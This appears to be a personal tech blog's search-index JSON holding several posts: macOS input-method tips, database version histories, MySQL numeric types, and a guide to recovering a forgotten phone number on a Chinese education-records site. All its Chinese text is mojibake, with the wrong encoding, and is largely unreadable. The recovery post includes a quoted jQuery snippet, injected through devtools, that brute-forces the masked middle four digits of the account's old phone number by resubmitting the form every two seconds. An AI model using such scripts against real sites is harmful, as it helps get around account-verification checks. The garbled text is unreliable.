è®¾ç½®ç¬¬ä¸‰æ–¹è¾“å…¥æ³•åœ¨ç¬¬ä¸€ä½\n\nç³»ç»Ÿåå¥½â†’è¯­è¨€ä¸åœ°åŒºâ†’é¦–é€‰è¯­è¨€ï¼ˆé€‰æ‹©ä¸­æ–‡ï¼‰â†’æˆåŠŸï¼ˆæœç‹—å°±æ’ç¬¬ä¸€äº†ï¼‰\n\nå½“ç„¶è¿™é‡Œçš„å‰ææ˜¯æŠŠç³»ç»Ÿè‡ªå¸¦çš„è‹±æ–‡è¾“å…¥æ³•å»æ‰ã€‚\n\nåšæ³•å°±æ˜¯ï¼Œç³»ç»Ÿåå¥½è®¾ç½®â†’è¾“å…¥æ³•â†’â•å·æ·»åŠ  å¨å°”å£«ğŸ´ó §ó ¢ó ·ó ¬ó ³ó ¿ â†’é€‰ä¸­ç³»ç»Ÿè‡ªå¸¦è‹±æ–‡ï¼Œâ–å·â†’æˆåŠŸã€‚\n\n\n\n### 2. è‡ªåŠ¨åˆ‡æ¢è¾“å…¥æ³•(æ¨è)\n\nAPPStore æœç´¢è‡ªåŠ¨åˆ‡æ¢è¾“å…¥æ³•, ä¸‹è½½ä½¿ç”¨å³å¯\n\nåœ¨è‡ªåŠ¨åˆ‡æ¢è¾“å…¥æ³•å†…ï¼Œæå‰è®¾ç½®æ¯ä¸ªAppå¯¹åº”çš„è¾“å…¥æ³•ï¼Œåˆ‡æ¢è‡³è¯¥Appæ—¶ï¼Œå°†ä¸ºæ‚¨è‡ªåŠ¨åˆ‡æ¢è‡³ä¸ºä»–è®¾å®šå¥½çš„è¾“å…¥æ³•ã€‚\n\nå¯¹åˆ‡æ¢é‡åº¦ç”¨æˆ·ï¼Œè‡ªåŠ¨åˆ‡æ¢å°†ä¸ºæ‚¨å‡å°‘95%ä»¥ä¸Šçš„æ‰‹åŠ¨åˆ‡æ¢æ¬¡æ•°ï¼Œå¤§å¹…æå‡è¾“å…¥ä½“éªŒã€‚\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/21466262\n+ https://www.better365.cn/AutoSwitchInput.html\n+ https://github.com/utatti/kawa\n","tags":["mac"],"categories":["ä½¿ç”¨"]},{"title":"æ•°æ®åº“å†å²ç‰ˆæœ¬ä»‹ç»","url":"%2Fp%2Fdb4b5549.html","content":"\n# 1. mysql\n\n| ç‰ˆæœ¬   | äº‹ä»¶                                                         | æ—¶é—´       | New                                                         |\n| ------ | ------------------------------------------------------------ | ---------- | ----------------------------------------------------------- |\n| 1.0    |1995       | ä»…ä¾›å†…éƒ¨ä½¿ç”¨                                                 |                                                              |\n| 3.11.1 |1996       |       First release                                                |                                                        |\n| 4.0    | 2002       |   æŸ¥è¯¢ç¼“å­˜ï¼Œè”åˆï¼Œå…¨æ–‡ï¼ŒInnoDB                                 |                                                           |\n| 5.0    | 2005       |        å­˜å‚¨çš„Routiesï¼Œè§†å›¾ï¼Œæ¸¸æ ‡ï¼Œè§¦å‘å™¨ï¼ŒXAäº‹åŠ¡ï¼ŒI_S               |                                                      |\n| 5.1    |2008-11-14 | äº‹ä»¶è°ƒåº¦ç¨‹åºï¼Œåˆ†ç±»ï¼Œæ’ä»¶APIï¼ŒRBRï¼ŒInnoDBæ’ä»¶ï¼ŒMySQLç¾¤é›†      |                                                              |\n| 5.5    |2010-12-03 |  InnoDBä»£æ›¿MyISAMæˆä¸ºMySQLé»˜è®¤çš„å­˜å‚¨å¼•æ“ã€‚                    |                                                             |\n| 5.6    | 2013-02-05 | åœ¨çº¿DDLï¼ŒGTIDï¼Œå¹¶è¡Œå¤åˆ¶ï¼ŒICPï¼ŒMRR......MySQL 5.6æ˜¯MySQLå†å²ä¸Šä¸€ä¸ªé‡Œç¨‹ç¢‘å¼çš„ç‰ˆæœ¬ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰ç”Ÿäº§ä¸Šåº”ç”¨å¾—æœ€å¹¿æ³›çš„ç‰ˆæœ¬ã€‚ | https://dev.mysql.com/doc/refman/5.6/en/mysql-nutshell.html |\n| 5.7    | 2015-10-21 |ç»„å¤åˆ¶,InnoDB Cluster,å¤šæºå¤åˆ¶, JSONæ”¯æŒ                     |  https://dev.mysql.com/doc/refman/5.7/en/mysql-nutshell.html |\n| 8.0    |2018-04-19 | ä¸å¯è§ç´¢å¼•,é™åºç´¢å¼•                                          |  https://dev.mysql.com/doc/refman/8.0/en/mysql-nutshell.html |\n\n<!-- more -->\n\n# 2. pgsql\n| ç‰ˆæœ¬   | æ—¶é—´                                                       | äº‹ä»¶ |\n| :----- | :----------------------------------------------------------: | :--: |\n| 6.0 | 1997-01-29|PostgreSQLé¦–æ¬¡å‘è¡Œå³é€‰æ‹©6.0ä½œä¸ºå…¶ç‰ˆæœ¬å·ï¼Œå”¯ä¸€ç´¢å¼•ï¼Œpg_dumpallå®ç”¨ç¨‹åºï¼Œèº«ä»½éªŒè¯ |\n| 8.0 | 2005-01-19|Microsoft Windowsä¸Šçš„æœ¬æœºæœåŠ¡å™¨ï¼Œä¿å­˜ç‚¹ï¼Œè¡¨ç©ºé—´ï¼Œæ—¶é—´ç‚¹æ¢å¤ |\n| 9.2 | 2012-09-10|çº§è”æµå¤åˆ¶ï¼Œä»…ç´¢å¼•æ‰«æï¼Œæœ¬æœºJSONæ”¯æŒï¼Œæ”¹è¿›çš„é”ç®¡ç†ï¼ŒèŒƒå›´ç±»å‹ï¼Œpg_receivexlogå·¥å…·ï¼Œç©ºé—´åˆ†åŒºçš„GiSTç´¢å¼• |\n| 9.4 | 2014-12-18 |JSONBæ•°æ®ç±»å‹ï¼Œç”¨äºæ›´æ”¹é…ç½®å€¼çš„ALTER SYSTEMè¯­å¥ï¼Œæ— éœ€é˜»å¡è¯»å–å³å¯åˆ·æ–°å®ä¾‹åŒ–è§†å›¾çš„åŠŸèƒ½ï¼Œåå°å·¥ä½œè¿›ç¨‹çš„åŠ¨æ€æ³¨å†Œ/å¯åŠ¨/åœæ­¢ï¼Œé€»è¾‘è§£ç APIï¼ŒGiNç´¢å¼•æ”¹è¿›ï¼ŒLinuxå¤§é¡µé¢æ”¯æŒï¼Œé€šè¿‡pg_prewarmé‡æ–°åŠ è½½æ•°æ®åº“ç¼“å­˜ ï¼Œå°†Hstoreé‡æ–°å¼•å…¥ä¸ºæ–‡æ¡£æ ·å¼æ•°æ®çš„é€‰æ‹©åˆ—ç±»å‹ã€‚ |\n| 9.6 |2016-09-29| å¹¶è¡ŒæŸ¥è¯¢æ”¯æŒï¼ŒPostgreSQLå¤–éƒ¨æ•°æ®åŒ…è£…å™¨ï¼ˆFDWï¼‰çš„æ”¹è¿›ï¼ˆé€šè¿‡æ’åº/è”æ¥ä¸‹æ¨ï¼‰ï¼Œå¤šä¸ªåŒæ­¥å¤‡ç”¨æ•°æ®åº“ï¼Œæ›´å¿«çš„å¤§è¡¨æ¸…ç† |\n| 10 | 2017-10-05|é€»è¾‘å¤åˆ¶ï¼Œå£°æ˜æ€§è¡¨åˆ†åŒºï¼Œæ”¹è¿›çš„æŸ¥è¯¢å¹¶è¡Œæ€§ |\n| 11 |2018-10-18| å¢å¼ºäº†åˆ†åŒºçš„å¥å£®æ€§å’Œæ€§èƒ½ï¼Œå­˜å‚¨è¿‡ç¨‹ä¸­æ”¯æŒçš„äº‹åŠ¡ï¼Œå¢å¼ºçš„æŸ¥è¯¢å¹¶è¡Œæ€§åŠŸèƒ½ï¼Œè¡¨è¾¾å¼çš„å®æ—¶ï¼ˆJITï¼‰ç¼–è¯‘ |\n| 12 | 2019-10-03|æ”¹è¿›æŸ¥è¯¢æ€§èƒ½å’Œç©ºé—´åˆ©ç”¨ç‡ï¼› SQL / JSONè·¯å¾„è¡¨è¾¾å¼æ”¯æŒï¼› ç”Ÿæˆçš„åˆ—ï¼› æ”¹å–„å›½é™…åŒ–å’Œè®¤è¯ï¼› æ–°çš„å¯æ’å…¥è¡¨å­˜å‚¨æ¥å£ã€‚ |\n| 13 |2020-09-24| Bæ ‘ç´¢å¼•æ¡ç›®çš„é‡å¤æ•°æ®åˆ é™¤èŠ‚çœäº†ç©ºé—´å¹¶æé«˜äº†æ€§èƒ½ï¼Œæ”¹è¿›äº†ä½¿ç”¨èšåˆæˆ–åˆ†åŒºè¡¨çš„æŸ¥è¯¢çš„æ€§èƒ½ï¼Œä½¿ç”¨æ‰©å±•ç»Ÿè®¡ä¿¡æ¯æ—¶æ›´å¥½çš„æŸ¥è¯¢è®¡åˆ’ï¼Œç´¢å¼•çš„å¹¶è¡Œæ¸…ç†ï¼Œå¢é‡æ’åºã€‚ |\n\n\n\n# 3. redis\n\n| ç‰ˆæœ¬ | æ—¶é—´           | äº‹ä»¶                                                         |\n| ---- | -------------- | ------------------------------------------------------------ |\n| 2.6  | 2012å¹´         | æœåŠ¡ç«¯æ”¯æŒLuaè„šæœ¬ã€‚                                          |\n| 2.8  | 2013å¹´11æœˆ22æ—¥ | å‘å¸ƒè®¢é˜…æ·»åŠ äº†pubsubå‘½ä»¤,slaveæ”¯æŒä»masteréƒ¨åˆ†åŒæ­¥           |\n| 3.0  | 2015å¹´4æœˆ1æ—¥   | Redis Clusterï¼šRedisçš„å®˜æ–¹åˆ†å¸ƒå¼å®ç°ã€‚                       |\n| 3.2  | 2016å¹´5æœˆ6æ—¥   | æ–°çš„Listç¼–ç ç±»å‹ï¼šquicklist,æ–°çš„RDBæ ¼å¼ã€‚                    |\n| 4.0  | 2017å¹´7æœˆ14æ—¥  | PSYNC2.0ï¼šä¼˜åŒ–äº†ä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œä¸»ä»èŠ‚ç‚¹åˆ‡æ¢å¿…ç„¶å¼•èµ·å…¨é‡å¤åˆ¶çš„é—®é¢˜ã€‚<br/>æä¾›äº†RDB-AOFæ··åˆæŒä¹…åŒ–æ ¼å¼ï¼Œå……åˆ†åˆ©ç”¨äº†AOFå’ŒRDBå„è‡ªä¼˜åŠ¿ã€‚ |\n| 5.0  | 2018å¹´10æœˆ     | æ–°çš„æµæ•°æ®ç±»å‹(Stream data type)                             |\n| 6.0  | 2020 å¹´5æœˆ2æ—¥  | å¤šçº¿ç¨‹                                                       |\n\n\n\n# 4. mongodb\n\n| ç‰ˆæœ¬  | æ—¶é—´          | äº‹ä»¶                                                   |\n| ----- | ------------- | ------------------------------------------------------ |\n| 1.0   | 2009          | é¦–æ¬¡åœ¨æ•°æ®åº“é¢†åŸŸäº®ç›¸ï¼Œæ‰“ç ´äº†å…³ç³»å‹æ•°æ®åº“ä¸€ç»Ÿå¤©ä¸‹çš„å±€é¢ |\n| 2.0.6 | 2012          |                                                        |\n| 2.4.8 | 2013          |                                                        |\n| 3.0.1 | 2017          |                                                        |\n| 4.0.2 | 2018          | æ”¯æŒå¤šæ–‡æ¡£äº‹åŠ¡                                         |\n| 5.0   | 2019          | å¼•å…¥åˆ†å¸ƒå¼äº‹åŠ¡                                         |\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://en.wikipedia.org/wiki/MySQL\n+ https://en.wikipedia.org/wiki/PostgreSQL","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"å­¦ä¿¡ç½‘æ³¨å†Œæ‰‹æœºå·ç å¿˜è®°äº†æ”¹ç»‘æ‰‹æœº","url":"%2Fp%2Fc27fdcd6.html","content":"\n\nç™»å½•å­¦ä¿¡ç½‘, å‘ç°æ‰‹æœºå·è¿˜æ˜¯å¤§å­¦æ—¶å€™ç”¨çš„æ‰‹æœºå·,  å·ç éƒ½å¿˜è®°äº†, æ”¹ç»‘ç°åœ¨çš„æ‰‹æœºè¿˜éœ€è¦å¿…å¡«ä»¥å‰çš„æ‰‹æœºå·. \n\nä¹‹å‰çš„æ‰‹æœºå·ä¸­é—´å››ä½æ˜¯`****`, æ‰€ä»¥ä¸€å…±æœ‰10000ç§å¯èƒ½.\n\n<!-- more -->\n\n# 1. è§£å†³æ–¹æ¡ˆ\n\n\n\n### 1.1 æš´åŠ›ç ´è§£\n\næ¯æ—¥éªŒè¯ç æ¬¡æ•°æœ‰é™, ä¸å»ºè®®.\n\n\n\n### 1.2 è·å–æ‰‹æœºå·ä¿¡æ¯(æœ€æœ‰æ•ˆ)\n\n1ï¼Œç”¨ä½ å­¦ä¿¡ç½‘çš„è´¦å·ç™»å½• é˜³å…‰é«˜è€ƒ https://gaokao.chsi.com.cn/\n\n2ï¼Œç‚¹å‡»å³è¾¹ ç‰¹æ®Šç±»å‹æ‹›ç”Ÿå…¥å£  \n\n3ï¼Œç‚¹å‡»å³è¾¹ æŠ¥åç™»å½• è¿›å»éšä¾¿é€‰æ‹©ä¸€ä¸ªï¼Œå¦‚ï¼šé«˜æ°´å¹³è¿åŠ¨å‘˜  è‰ºæœ¯ç±»\n\n4ï¼Œè¿›å…¥æŠ¥åï¼ŒåŒæ„æ¡æ¬¾ï¼Œç¡®è®¤èº«ä»½è¯ï¼Œåˆ°ä¸ªäººä¿¡æ¯çš„æ—¶å€™å°±èƒ½çœ‹è§ç”µè¯å·ç äº†ã€‚\n\n\n\n### 1.3 æŠ€æœ¯æ–¹æ¡ˆ\n\nå­¦ä¿¡ç½‘é€šè¿‡åŠ å¯†æ–¹å¼æ˜¾ç¤ºæ‰‹æœºå·ï¼Œéšè—äº†åŸæ¥æ‰‹æœºå·çš„ä¸­é—´4ä½ï¼Œä¿®æ”¹æ‰‹æœºå·çš„æ—¶å€™éœ€è¦æä¾›åŸæ¥æ‰‹æœºå·ï¼Œå¹¶ä¸”éœ€è¦æ–°æ‰‹æœºå·æ¥æ”¶ä¸€ä¸ªéªŒè¯ç ï¼Œå¹¸è¿çš„æ˜¯è¿™ä¸ªéªŒè¯ç æ˜¯24å°æ—¶å†…æœ‰æ•ˆï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£çš„æ–¹å¼ï¼Œæ¯2ç§’é’Ÿå°è¯•ä¸€ä¸ªç”µè¯å·ç ï¼Œæœ€å¤šä¼šå°è¯•10000æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€é•¿æ—¶é—´éœ€è¦è€—æ—¶20000ç§’ï¼ˆå¤§çº¦5ä¸ªåŠå°æ—¶ï¼‰ï¼Œä¸è¿‡ä¸€èˆ¬ä¸ä¼šé‚£ä¹ˆç‚¹èƒŒï¼Œå°è¯•åˆ°9999çš„æ—¶å€™æ‰ä¿®æ”¹æˆåŠŸã€‚å½“ç„¶è¿™ä¸ªä¸å¯èƒ½äººå·¥å»å®Œæˆç ´è§£ï¼Œéœ€è¦å†™ä»£ç ã€‚\n\nè™½ç„¶æˆ‘åœ¨ä¸­é€”æµ‹è¯•ä¸­æ”¾å¼ƒäº†, ä½†æ˜¯è‡´æ•¬è¿™ä½å¤§ä½¬.  å‚è€ƒ: http://www.jsunw.com/?post=36\n\n1. é€šè¿‡firefoxæˆ–è€…chromeæ‰“å¼€æ‰‹æœºå·ç¼–è¾‘é¡µé¢ï¼Œé¦–å…ˆéšä¾¿è¾“å…¥ä¸€ä¸ªåŸæ‰‹æœºå·ï¼Œä¿®æ”¹ä¸€æ¬¡ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ‹¿åˆ°éªŒè¯ç \n2. æ‰“å¼€æ§åˆ¶å°ï¼Œå®šä½è‡³â€œç¡®å®šâ€æŒ‰é’®\n3. å³é”®è¿™ä¸ª`<input>`æ ‡ç­¾ï¼Œç¼–è¾‘htmlä»£ç ï¼Œåœ¨è¿™ä¸ª`<input>`æ ‡ç­¾åé¢æ·»åŠ ä¸‹é¢ä»£ç ï¼š\n\n```html\n<input type=\"button\" value=\"start\" onclick=\"(function (btn, form, input, start, iframeName, speed) {if (!form.attr('target')) {$('<iframe></iframe>').attr('name', iframeName).insertBefore(form.attr('target', iframeName));}if (window.jsunw == null) {input.val(start);}if (window.jsunw) {clearInterval(window.jsunw);window.jsunw = 0;btn.val('go on').attr('title', 'start');} else {window.jsunw = setInterval(function () {if (parseInt(input.val().replace(/(\\d{3})\\d{4}(\\d{4})/g, '$10000$2')) != start) {input.val(start);}var v = parseInt(input.val());v = v > (start + 99990000) ? start : v + 10000;input.val(v);}, speed);btn.val('working...').attr('title', 'pause');}})($(this), $(this).closest('form'), $(this).closest('tbody').find('[name=oldMobilePhone]'), parseInt($(this).closest('#setPhone').find('>strong').text().replace(/\\*/g, '0')), 'setPhoneTarget', 2000);\">\n```\n\nå¦‚ä¸‹å›¾:\n\n![1](http://www.jsunw.com/content/uploadfile/201806/eabe1529569128.png)\n\n4. åœ¨é¡µé¢ä¸­å•å‡»æ–°æ·»åŠ çš„è¿™ä¸ªæŒ‰é’®åï¼ŒæŸ¥çœ‹â€œåŸæ‰‹æœºå·â€å¯¹åº”çš„è¾“å…¥æ¡†ï¼Œé‡Œé¢çš„æ‰‹æœºå·åº”è¯¥æ¯éš”ä¸¤ç§’è‡ªåŠ¨æ”¹å˜ä¸€æ¬¡ï¼Œè¿™å°±è¯´æ˜ç ´è§£è„šæœ¬æ­£åœ¨æ‰§è¡Œã€‚\n\n5. ä¿æŒè¿™ä¸ªé¡µé¢ä¸è¦åŠ¨ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå¦å¤–æ‰“å¼€ä¸€ä¸ªé¡µé¢æŸ¥çœ‹æ‰‹æœºå·æ˜¯å¦å·²ç»ä¿®æ”¹ï¼Œå¦‚æœä¿®æ”¹æˆåŠŸï¼Œé‚£å°±æ­å–œä½ äº†ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å…³é—­è¿™ä¸ªè„šæœ¬é¡µé¢äº†ã€‚\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://zhidao.baidu.com/question/585034076726360365.html\n+ http://www.jsunw.com/?post=36","tags":["å­¦ä¿¡ç½‘"],"categories":["ä¸ªäººè®°å½•"]},{"title":"mysqlåŸºç¡€çŸ¥è¯†","url":"%2Fp%2Fab5fc61f.html","content":"\n\n# 1. mysql æ•°å€¼æ•°æ®ç±»å‹\n\nMySQLæ”¯æŒæ‰€æœ‰æ ‡å‡†çš„SQLæ•°å€¼æ•°æ®ç±»å‹ã€‚è¿™äº›ç±»å‹åŒ…æ‹¬ç²¾ç¡®çš„æ•°å­—æ•°æ®ç±»å‹ï¼ˆINTEGERã€SMALLINTã€DECIMALå’ŒNUMERICï¼Œä»¥åŠè¿‘ä¼¼æ•°å­—æ•°æ®ç±»å‹ï¼ˆFLOATã€REALå’ŒDOUBLE PRECISIONï¼‰ã€‚\n\n+ INTæ˜¯INTEGERçš„åŒä¹‰è¯ã€‚\n\n+ DEC, FIXED, NUMERICæ˜¯DECIMALçš„åŒä¹‰è¯ã€‚\n\n+ DOUBLEè§†ä¸ºDOUBLE PRECISIONï¼ˆéæ ‡å‡†æ‰©å±•ï¼‰çš„åŒä¹‰è¯ã€‚\n\n+ REALè§†ä¸ºDOUBLE PRECISIONï¼ˆéæ ‡å‡†å˜ä½“ï¼‰çš„åŒä¹‰è¯ï¼Œé™¤éå¯ç”¨REAL_AS_FLOAT SQLæ¨¡å¼ã€‚\n\nä»MySQL8.0.17å¼€å§‹ï¼ŒZEROFILLå±æ€§ä¸æ¨èç”¨äºæ•°å€¼æ•°æ®ç±»å‹ï¼Œåœ¨æœªæ¥çš„MySQLç‰ˆæœ¬ä¸­ï¼Œå¯¹å®ƒçš„æ”¯æŒå°†è¢«åˆ é™¤ã€‚\n\n<!-- more -->\n\n### 1.1 æ•´æ•°\n\nå¯¹äºæ•´æ•°æ•°æ®ç±»å‹ï¼ŒMè¡¨ç¤ºæœ€å¤§æ˜¾ç¤ºå®½åº¦ã€‚æœ€å¤§æ˜¾ç¤ºå®½åº¦ä¸º255ã€‚æ˜¾ç¤ºå®½åº¦ä¸ç±»å‹å¯ä»¥å­˜å‚¨çš„å€¼èŒƒå›´æ— å…³ã€‚\n\n| Type      | Storage (Bytes) | Minimum Value Signed | Minimum Value Unsigned | Maximum Value Signed | Maximum Value Unsigned |\n| --------- | --------------- | -------------------- | ---------------------- | -------------------- | ---------------------- |\n| TINYINT   | 1               | -128                 | 0                      | 127                  | 255                    |\n| SMALLINT  | 2               | -32768               | 0                      | 32767                | 65535                  |\n| MEDIUMINT | 3               | -8388608             | 0                      | 8388607              | 16777215               |\n| INT       | 4               | -2147483648          | 0                      | 2147483647           | 4294967295             |\n| BIGINT    | 8               | -2^63                | 0                      | 2^63 -1              | 2^64 -1                |\n\n+ [TINYINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA very small integer. The signed range is -128 to 127. The unsigned range is 0 to 255.\n\n\n\n+ [BOOL](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html), [BOOLEAN](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nThese types are synonyms for [TINYINT(1)](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html). A value of zero is considered false. Nonzero values are considered true\n\n\n\n+ [SMALLINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA small integer. The signed range is -32768 to 32767. The unsigned range is 0 to 65535.\n\n\n\n+ [MEDIUMINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA medium-sized integer. The signed range is -8388608 to 8388607. The unsigned range is 0 to 16777215.\n\n\n\n+ [INT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\n  [INTEGER[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA normal-size integer. The signed range is -2147483648 to 2147483647. The unsigned range is 0 to 4294967295.\n\n\n\n+ [BIGINT[(**M**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/integer-types.html)\n\nA large integer. The signed range is -9223372036854775808 to 9223372036854775807. The unsigned range is 0 to 18446744073709551615.\n\n\n\n### 1.2 å°æ•°\n\nå¯¹äºæµ®ç‚¹å’Œå®šç‚¹æ•°æ®ç±»å‹ï¼ŒMæ˜¯å¯å­˜å‚¨çš„æ€»ä½æ•°ã€‚\n\n+ ç¬¬ä¸€ç±»\n\n[DECIMAL[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[DEC[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[NUMERIC[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n[FIXED[(**M**[,**D**\\])] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/fixed-point-types.html)\n\n\n\nMæ˜¯æ€»ä½æ•°ï¼ˆç²¾åº¦ï¼‰ï¼ŒDæ˜¯å°æ•°ç‚¹åçš„ä½æ•°ï¼ˆåˆ»åº¦ï¼‰ã€‚åè¿›åˆ¶çš„æœ€å¤§ä½æ•°ï¼ˆMï¼‰ä¸º65ã€‚æ”¯æŒçš„æœ€å¤§å°æ•°ä½æ•°ï¼ˆDï¼‰ä¸º30ã€‚\n\nå¦‚æœçœç•¥Mï¼Œé»˜è®¤å€¼ä¸º10ã€‚å¦‚æœçœç•¥Dï¼Œé»˜è®¤å€¼ä¸º0ã€‚\n\nå°æ•°ç‚¹å’Œï¼ˆå¯¹äºè´Ÿæ•°ï¼‰ç¬¦å·ä¸è®¡ç®—åœ¨Mä¸­ã€‚å¦‚æœDä¸º0ï¼Œåˆ™å€¼æ²¡æœ‰å°æ•°ç‚¹æˆ–å°æ•°éƒ¨åˆ†ã€‚\n\nä»MySQL 8.0.17å¼€å§‹ï¼ŒDECIMALç±»å‹çš„åˆ—ï¼ˆä»¥åŠä»»ä½•åŒä¹‰è¯ï¼‰éƒ½ä¸æ¨èä½¿ç”¨UNSIGNEDå±æ€§ï¼Œåœ¨å°†æ¥çš„MySQLç‰ˆæœ¬ä¸­ï¼Œå°†åˆ é™¤å¯¹å®ƒçš„æ”¯æŒã€‚\n\n\n\n+ ç¬¬äºŒç±»\n\n[FLOAT[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nMæ˜¯æ€»ä½æ•°ï¼ŒDæ˜¯å°æ•°ç‚¹åçš„ä½æ•°ã€‚å¦‚æœçœç•¥Må’ŒDï¼Œåˆ™å€¼å­˜å‚¨åœ¨ç¡¬ä»¶å…è®¸çš„èŒƒå›´å†…ã€‚å•ç²¾åº¦æµ®ç‚¹æ•°ç²¾ç¡®åˆ°å°æ•°ç‚¹å7ä½å·¦å³ã€‚\n\nFLOATï¼ˆMï¼ŒDï¼‰æ˜¯ä¸€ä¸ªéæ ‡å‡†çš„MySQLæ‰©å±•ã€‚ä»MySQL 8.0.17å¼€å§‹ï¼Œä¸æ¨èä½¿ç”¨è¿™ç§è¯­æ³•ï¼Œåœ¨å°†æ¥çš„MySQLç‰ˆæœ¬ä¸­å°†åˆ é™¤å¯¹å®ƒçš„æ”¯æŒã€‚\n\n\n\n+ ç¬¬ä¸‰ç±»\n\n[DOUBLE[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n[DOUBLE PRECISION[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n[REAL[(**M**,**D**)\\] [UNSIGNED] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nMæ˜¯æ€»ä½æ•°ï¼ŒDæ˜¯å°æ•°ç‚¹åçš„ä½æ•°ã€‚å¦‚æœçœç•¥Må’ŒDï¼Œåˆ™å€¼å­˜å‚¨åœ¨ç¡¬ä»¶å…è®¸çš„èŒƒå›´å†…ã€‚åŒç²¾åº¦æµ®ç‚¹æ•°ç²¾ç¡®åˆ°å°æ•°ç‚¹å15ä½å·¦å³ã€‚DOUBLEï¼ˆMï¼ŒDï¼‰æ˜¯ä¸€ä¸ªéæ ‡å‡†çš„MySQLæ‰©å±•ã€‚ä»MySQL 8.0.17å¼€å§‹ï¼Œä¸æ¨èä½¿ç”¨è¿™ç§è¯­æ³•ï¼Œåœ¨å°†æ¥çš„MySQLç‰ˆæœ¬ä¸­å°†åˆ é™¤å¯¹å®ƒçš„æ”¯æŒã€‚\n\n\n\n+ ç¬¬å››ç±»\n\n[FLOAT(**p**) [UNSIGNED\\] [ZEROFILL]](https://dev.mysql.com/doc/refman/8.0/en/floating-point-types.html)\n\n\n\nå¦‚æœpä»0åˆ°24ï¼Œæ•°æ®ç±»å‹å˜ä¸ºFLOATï¼Œæ²¡æœ‰Mæˆ–Då€¼ã€‚å¦‚æœpä»25åˆ°53ï¼Œæ•°æ®ç±»å‹å˜ä¸ºDOUBLEï¼Œæ²¡æœ‰Mæˆ–Då€¼ã€‚\n\n\n\n### 1.3 æ€»ç»“\n\n+ æµ®ç‚¹æ•°ä¸æ¨èä½¿ç”¨ FLOAT å’Œ DOUBLE\n+ æµ®ç‚¹æ•°æ¨èä½¿ç”¨DECIMAL, ä¸æ¨èä½¿ç”¨æ— ç¬¦å·\n\n\n\n# 2. int(11)  æ‹¬å·çš„æ•°å­—\n\nå¯¹äºæ•´æ•°æ•°æ®ç±»å‹ï¼ŒMè¡¨ç¤ºæœ€å¤§æ˜¾ç¤ºå®½åº¦ã€‚æœ€å¤§æ˜¾ç¤ºå®½åº¦ä¸º255ã€‚æ˜¾ç¤ºå®½åº¦ä¸ç±»å‹å¯ä»¥å­˜å‚¨çš„å€¼èŒƒå›´æ— å…³ã€‚\n\n### 2.1 int(1)ã€tinyint(4) å“ªä¸ªå¤§?\n\nint å¤§ã€‚\n\næ³¨æ„æ•°å­—ç±»å‹åé¢æ‹¬å·ä¸­çš„æ•°å­—ï¼Œä¸è¡¨ç¤ºé•¿åº¦ï¼Œè¡¨ç¤ºçš„æ˜¯æ˜¾ç¤ºå®½åº¦ï¼Œè¿™ç‚¹ä¸ varcharã€char åé¢çš„æ•°å­—å«ä¹‰æ˜¯ä¸åŒçš„ã€‚\n\nä¹Ÿå°±æ˜¯è¯´ä¸ç®¡ int åé¢çš„æ•°å­—æ˜¯å¤šå°‘ï¼Œå®ƒå­˜å‚¨çš„èŒƒå›´å§‹ç»ˆæ˜¯ -2^31 åˆ° 2^31 - 1ï¼Œä½†æ˜¯int(1)åªæ˜¾ç¤ºä¸ªä½æ•°ã€‚\n\nç»¼ä¸Šæ•´å‹çš„æ•°æ®ç±»å‹æ‹¬å·å†…çš„æ•°å­—ä¸ç®¡æ˜¯å¤šå°‘ï¼Œæ‰€å çš„å­˜å‚¨ç©ºé—´éƒ½æ˜¯ä¸€æ ·ã€‚\n\n\n\n# 3. char(4) å’Œ varchar(4) æ‹¬å·çš„æ•°å­—\n\nCHARå’ŒVARCHARç±»å‹å£°æ˜çš„é•¿åº¦æŒ‡ç¤ºè¦å­˜å‚¨çš„æœ€å¤§å­—ç¬¦æ•°ã€‚\n\nä¾‹å¦‚ï¼ŒCHARï¼ˆ30ï¼‰æœ€å¤šå¯å®¹çº³30ä¸ªå­—ç¬¦ã€‚å¦‚æœæ˜¯utf8mb4æ ¼å¼, æœ€å¤šå¯å®¹çº³30ä¸ªå­—ç¬¦æˆ–æ±‰å­—ã€‚\n\n### 3.1 